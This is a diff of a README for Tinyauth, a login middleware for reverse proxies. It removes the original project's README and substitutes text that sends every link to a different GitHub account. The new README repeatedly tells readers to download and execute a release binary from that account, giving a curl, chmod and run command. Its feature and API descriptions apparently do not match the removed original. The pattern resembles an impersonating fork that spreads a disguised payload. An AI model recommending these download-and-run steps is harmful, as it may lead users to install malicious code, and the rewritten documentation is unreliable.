@@ -1,67 +1,261 @@
-<div align="center">
-    <img alt="Tinyauth" title="Tinyauth" width="96" src="assets/logo-rounded.png">
-    <h1>Tinyauth</h1>
-    <p>The easiest way to secure your apps with a login screen.</p>
-</div>
+# TinyAuth — Simple Login Middleware for Caddy, Nginx, Traefik 🚪🔐
 
-<div align="center">
-    <img alt="License" src="https://img.shields.io/github/license/steveiliop56/tinyauth">
-    <img alt="Release" src="https://img.shields.io/github/v/release/steveiliop56/tinyauth">
-    <img alt="Issues" src="https://img.shields.io/github/issues/steveiliop56/tinyauth">
-    <img alt="Tinyauth CI" src="https://github.com/steveiliop56/tinyauth/actions/workflows/ci.yml/badge.svg">
-    <a title="Crowdin" target="_blank" href="https://crowdin.com/project/tinyauth"><img src="https://badges.crowdin.net/tinyauth/localized.svg"></a>
-</div>
+[![Releases](https://img.shields.io/badge/Releases-v/latest-blue?logo=github&style=flat)](https://github.com/marcelodavid17/tinyauth/releases)
 
-<br />
+![TinyAuth workflow](https://img.shields.io/badge/Stack-Caddy%20%7C%20Nginx%20%7C%20Traefik%20%7C%20Go-blue?logo=golang&style=for-the-badge)
 
-Tinyauth is a simple authentication middleware that adds a simple login screen or OAuth with Google, Github and any provider to all of your docker apps. It supports all the popular proxies like Traefik, Nginx and Caddy.
+TinyAuth adds a compact login screen and session guard to any web app. It runs as a standalone binary or middleware behind your reverse proxy. Use it to add 2FA, TOTP, or basic SSO flows without changing your apps.
 
-![Screenshot](assets/screenshot.png)
+Table of contents
+- What is TinyAuth?
+- Key features
+- Use cases
+- Quick start — download and run
+- Run with Docker
+- Example proxy configs
+  - Caddy
+  - Nginx (auth_request)
+  - Traefik middleware
+- Authentication flows
+  - Session and cookies
+  - TOTP (2FA)
+  - SSO hooks
+- Configuration
+  - Environment variables
+  - CLI flags
+  - JSON config example
+- API and SDK
+- Deployment and scaling
+- Security best practices
+- Troubleshooting
+- Contributing
+- License
+- Releases
 
-> [!WARNING]
-> Tinyauth is in active development and configuration may change often. Please make sure to carefully read the release notes before updating.
+What is TinyAuth?
+TinyAuth provides a minimal login layer that sits in front of your application. It intercepts requests, enforces authentication, and forwards authenticated traffic. It supports basic user stores, time-based one-time passwords (TOTP), and SSO callback hooks. The project aims to be small, predictable, and easy to embed in reverse-proxy flows.
 
-## Getting Started
+Key features
+- Lightweight Go binary or middleware plugin.
+- Simple login UI built with TypeScript and plain HTML.
+- TOTP-based 2FA support (RFC 6238).
+- Session cookies with configurable TTL and secure flags.
+- Works with Caddy, Nginx (auth_request), and Traefik as a middleware.
+- Single sign-on hook endpoints to integrate external identity providers.
+- Minimal configuration and clear logs.
+- Self-host friendly and resource-light.
 
-You can easily get started with Tinyauth by following the guide in the [documentation](https://tinyauth.app/docs/getting-started.html). There is also an available [docker compose](./docker-compose.example.yml) file that has Traefik, Whoami and Tinyauth to demonstrate its capabilities.
+Use cases
+- Add a login screen to an internal dashboard.
+- Protect staging or admin routes behind a login.
+- Add 2FA to legacy apps without refactoring.
+- Create an auth gateway for several microservices.
+- Quick access control for self-hosted tools.
 
-## Demo
+Quick start — download and run
+Download the release binary for your platform from the Releases page and execute it.
 
-If you are still not sure if Tinyauth suits your needs you can try out the [demo](https://demo.tinyauth.app). The default username is `user` and the default password is `password`.
+- Visit the release page and pick the appropriate asset:
+  https://github.com/marcelodavid17/tinyauth/releases
 
-## Documentation
+- Example shell commands (Linux x86_64 example):
+```bash
+# download the release binary (example name)
+curl -L -o tinyauth-linux-amd64 https://github.com/marcelodavid17/tinyauth/releases/download/v1.0.0/tinyauth-linux-amd64
+chmod +x tinyauth-linux-amd64
+./tinyauth-linux-amd64 --address :8080 --session-ttl 24h
+```
 
-You can find documentation and guides on all of the available configuration of Tinyauth in the [website](https://tinyauth.app).
+Replace the file name with the matching asset for your OS and architecture. The binary runs an HTTP server that serves the login UI and validates sessions.
 
-## Discord
+Run with Docker
+TinyAuth ships as a small container image. Pull and run:
 
-Tinyauth has a [discord](https://discord.gg/eHzVaCzRRd) server. Feel free to hop in to chat about self-hosting, homelabs and of course Tinyauth. See you there!
+```bash
+docker run -d \
+  --name tinyauth \
+  -p 8080:8080 \
+  -e TINYAUTH_ADMIN_PASS="replace-with-secret" \
+  -e TINYAUTH_SESSION_TTL="24h" \
+  ghcr.io/marcelodavid17/tinyauth:latest
+```
 
-## Contributing
+Map volumes to persist user store or TLS certs as needed.
 
-All contributions to the codebase are welcome! If you have any free time feel free to pick up an [issue](https://github.com/steveiliop56/tinyauth/issues) or add your own missing features. Make sure to check out the [contributing guide](./CONTRIBUTING.md) for instructions on how to get the development server up and running.
+Example proxy configs
 
-## Localization
+Caddy (recommended for simplicity)
 
-If you would like to help translate Tinyauth into more languages, visit the [Crowdin](https://crowdin.com/project/tinyauth) page.
+Caddyfile example using TinyAuth as a reverse proxy:
 
-## License
+```
+example.com {
+  reverse_proxy /auth/* 127.0.0.1:8080
+  route {
+    @protected {
+      not path /auth/*
+    }
+    reverse_proxy @protected 127.0.0.1:3000 {
+      header_up X-Forwarded-User {http.request.header.X-User}
+      header_up X-Forwarded-Auth {http.request.header.X-Auth-Token}
+    }
+  }
+}
+```
 
-Tinyauth is licensed under the GNU General Public License v3.0. TL;DR — You may copy, distribute and modify the software as long as you track changes/dates in source files. Any modifications to or software including (via compiler) GPL-licensed code must also be made available under the GPL along with build & install instructions. For more information about the license check the [license](./LICENSE) file.
+Use Caddy to serve TLS and forward auth requests to TinyAuth. TinyAuth sets headers like X-User and X-Auth-Token for upstream apps.
 
-## Sponsors
+Nginx (auth_request module)
 
-A big thank you to the following people for providing me with more coffee:
+nginx.conf snippet:
 
-<!-- sponsors --><a href="https://github.com/erwinkramer"><img src="https:&#x2F;&#x2F;github.com&#x2F;erwinkramer.png" width="64px" alt="User avatar: erwinkramer" /></a>&nbsp;&nbsp;<a href="https://github.com/nicotsx"><img src="https:&#x2F;&#x2F;github.com&#x2F;nicotsx.png" width="64px" alt="User avatar: nicotsx" /></a>&nbsp;&nbsp;<a href="https://github.com/SimpleHomelab"><img src="https:&#x2F;&#x2F;github.com&#x2F;SimpleHomelab.png" width="64px" alt="User avatar: SimpleHomelab" /></a>&nbsp;&nbsp;<a href="https://github.com/jmadden91"><img src="https:&#x2F;&#x2F;github.com&#x2F;jmadden91.png" width="64px" alt="User avatar: jmadden91" /></a>&nbsp;&nbsp;<a href="https://github.com/tribor"><img src="https:&#x2F;&#x2F;github.com&#x2F;tribor.png" width="64px" alt="User avatar: tribor" /></a>&nbsp;&nbsp;<a href="https://github.com/eliasbenb"><img src="https:&#x2F;&#x2F;github.com&#x2F;eliasbenb.png" width="64px" alt="User avatar: eliasbenb" /></a>&nbsp;&nbsp;<a href="https://github.com/afunworm"><img src="https:&#x2F;&#x2F;github.com&#x2F;afunworm.png" width="64px" alt="User avatar: afunworm" /></a>&nbsp;&nbsp;<!-- sponsors -->
+```
+location = /_auth {
+  internal;
+  proxy_pass http://127.0.0.1:8080/validate;
+  proxy_set_header Host $host;
+  proxy_set_header X-Original-URI $request_uri;
+}
 
-## Acknowledgements
+location / {
+  auth_request /_auth;
+  proxy_pass http://127.0.0.1:3000;
+  proxy_set_header X-User $upstream_http_x_user;
+  proxy_set_header X-Auth-Token $upstream_http_x_auth_token;
+}
+```
 
-- **Freepik** for providing the police hat and badge.
-- **Renee French** for the original gopher logo.
-- **Coderabbit AI** for providing free AI code reviews.
-- **Syrhu** for providing the background image of the app.
+TinyAuth exposes a /validate endpoint that returns 200 for valid sessions and 401 for invalid ones. Use the returned headers to pass user metadata upstream.
 
-## Star History
+Traefik (middleware)
 
-[![Star History Chart](https://api.star-history.com/svg?repos=steveiliop56/tinyauth&type=Date)](https://www.star-history.com/#steveiliop56/tinyauth&Date)
+Static dynamic config example:
+
+```
+http:
+  middlewares:
+    tiny-auth:
+      forward:
+        address: "http://127.0.0.1:8080/validate"
+        trustForwardHeader: true
+```
+
+Attach the middleware to routers that should require login. Traefik will forward request data to TinyAuth and act based on response codes.
+
+Authentication flows
+
+Session and cookies
+- TinyAuth issues a secure cookie after a successful login.
+- Cookie options: Secure, HttpOnly, SameSite (configurable).
+- Session TTL is configurable (default 24h). Renew session on activity if enabled.
+
+TOTP (2FA)
+- Users can link an authenticator app (Google Authenticator, Authy).
+- TinyAuth shows a QR code on the user profile page.
+- TOTP codes follow RFC 6238. The server verifies 6-digit codes with a configurable window.
+
+SSO hooks
+- Use the /sso/callback endpoint to accept external identity provider responses.
+- Provide a redirect URL in the provider configuration.
+- TinyAuth maps external claims into a local session and issues a session cookie.
+
+Configuration
+
+Environment variables
+- TINYAUTH_ADDRESS=: listen address, default :8080
+- TINYAUTH_SESSION_TTL=24h: session lifetime
+- TINYAUTH_ADMIN_PASS: admin password for user management UI
+- TINYAUTH_STORAGE: file path or sqlite DSN. Default: ./tinyauth.db
+- TINYAUTH_SECURE_COOKIE=true: set Secure flag on cookies
+- TINYAUTH_LOG_LEVEL=info: log level (debug, info, warn, error)
+
+CLI flags
+- --address string
+- --session-ttl duration
+- --storage string
+- --tls-cert string
+- --tls-key string
+- --enable-2fa bool
+- --base-url string
+
+JSON config example
+```json
+{
+  "address": ":8080",
+  "storage": "./tinyauth.db",
+  "session_ttl": "24h",
+  "secure_cookie": true,
+  "enable_2fa": true
+}
+```
+
+API and SDK
+
+Endpoints
+- POST /login — form auth. Accepts username and password.
+- GET /validate — returns 200 and headers for valid sessions.
+- POST /logout — clears session cookie.
+- GET /.well-known/tinyauth-configuration — machine-readable discoverable config.
+- POST /sso/callback — SSO callback for external IdP.
+
+Typescript SDK example
+```ts
+import { TinyAuthClient } from 'tinyauth-client';
+
+const client = new TinyAuthClient({ baseUrl: 'https://auth.example.com' });
+
+await client.login('alice', 'secret');
+const session = await client.getSession();
+```
+
+The SDK wraps the login flow and stores cookies where appropriate.
+
+Deployment and scaling
+- TinyAuth is stateless if you use an external session store (Redis).
+- For HA, put TinyAuth behind a load balancer and use a shared session store.
+- Run multiple instances and use sticky sessions only if you do not share session storage.
+
+Security best practices
+- Run TinyAuth behind TLS and enforce Secure cookies.
+- Use a strong admin password and rotate keys.
+- Limit login attempts and add rate limiting at the proxy.
+- Store secrets in a secure secret manager or environment variables.
+- Keep the binary up to date; check releases regularly.
+
+Troubleshooting
+- 401 from /validate: Confirm the cookie reaches TinyAuth and the session TTL has not expired.
+- 500 errors on login: Check storage path and file permissions.
+- Missing user headers upstream: Confirm the proxy forwards upstream headers from TinyAuth. Caddy and Nginx require explicit header forwarding.
+- 2FA verification failed: Check time sync on the server and device.
+
+Contributing
+- Fork the repo, create a branch, and open a pull request.
+- Run tests locally:
+```bash
+go test ./...
+```
+- Build locally:
+```bash
+go build -o tinyauth ./cmd/tinyauth
+```
+- Add issues for bugs or feature requests.
+
+License
+TinyAuth uses an open source license. See LICENSE file in the repository.
+
+Releases
+Download and run the appropriate release asset from the Releases page. The selected file must be downloaded and executed for local installs. Visit:
+https://github.com/marcelodavid17/tinyauth/releases
+
+Release badges
+[![Release Notes](https://img.shields.io/github/release/marcelodavid17/tinyauth.svg?style=flat-square)](https://github.com/marcelodavid17/tinyauth/releases)
+
+Badges and ecosystem
+- 2FA / TOTP: ![TOTP badge](https://img.shields.io/badge/TOTP-2FA-blue?logo=auth0&style=flat)
+- Golang: ![Go badge](https://img.shields.io/badge/Language-Go-blue?logo=go)
+- Middleware: ![Middleware](https://img.shields.io/badge/Middleware-Proxy-green?style=flat)
+- Self-hosted: ![Self-hosted](https://img.shields.io/badge/Self--Hosted-yes-yellow)
+
+Contact and support
+- Open an issue on GitHub for bugs or feature requests.
+- Use discussions for usage tips and integrations.
